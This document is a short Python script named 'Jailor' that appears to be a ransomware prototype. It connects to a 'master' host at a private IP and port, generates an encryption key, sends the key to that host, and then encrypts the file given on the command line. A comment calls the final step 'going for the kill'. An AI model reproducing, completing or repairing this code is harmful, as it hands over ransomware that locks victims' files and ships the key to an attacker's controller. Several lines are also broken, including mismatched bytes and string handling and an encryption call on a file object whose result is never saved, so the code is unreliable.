from pathlib import Path
from cryptography.fernet import Fernet
import socket
import argparse

MASTER = "192.168.56.1"
PORT = 6969
ADDR = (MASTER, PORT)
FORMAT = "utf-8"
HEADER = 64
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

#reading file path from argument
parser = argparse.ArgumentParser(prog='Jailor', usage='main.py <full path to file>', description='This program encrypts folders and files given in the path as arguments')
parser.add_argument('path')
args = parser.parse_args()

#defining file path object to use in code
filepath = Path(args.path)

#manufacturing encryption key, saving encryption key, sending it to master before finally encrypting
key = Fernet.generate_key()
def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)
    
send(key)

open("backup.txt", "w").write(key)

#finally...going for the kill
Fernet(key).encrypt(open(filepath))

